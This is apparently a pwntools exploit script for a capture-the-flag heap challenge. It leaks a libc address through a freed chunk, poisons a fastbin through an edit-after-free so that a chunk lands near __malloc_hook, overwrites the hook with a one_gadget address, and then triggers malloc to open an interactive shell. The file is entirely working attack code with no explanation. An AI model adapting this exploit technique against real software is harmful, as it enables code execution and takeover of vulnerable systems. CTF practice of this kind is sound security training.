from pwn import  *
elf=ELF("./chall")
libc=ELF("./libc.so.6")

#r=gdb.debug("./chall")
r=process("./chall")

INDEX = 0

def malloc( size, data):
    global INDEX
    r.send("1")
    r.sendafter("size:", str(size))
    r.recvuntil(">")

    INDEX += 1
    return (INDEX - 1)


def free( index):
    r.send("3")
    r.sendafter("index", str(index))
    r.recvuntil(">")
def read(index):
    r.send("4")
    r.sendafter("index",str(index))
    return r.recvline()
def edit(index,data):
    r.send("2")
    r.sendafter("index",str(index))
    r.sendafter("data",data)

onegadget=[0x3ff5e,0x3ffb2,0xd6fb1]
a=malloc(200,b"11")
b=malloc(0x78,b"11")
c=malloc(0x68,b"11")
free(a)
a=read(0)[9:17]
libc.address=u64(a) -0x58 -libc.sym.main_arena
a=malloc(200,b"")
free(b)
free(c)
edit(c,p64(libc.sym.__malloc_hook -0x23))
d1=malloc(0x68,p64(0xdeaddead))
d2=malloc(0x68,b"11")
edit(d2,p8(0x41)*0x13+p64(libc.address+onegadget[2]))
r.send("1")
r.sendafter("size",b"1")
r.interactive()


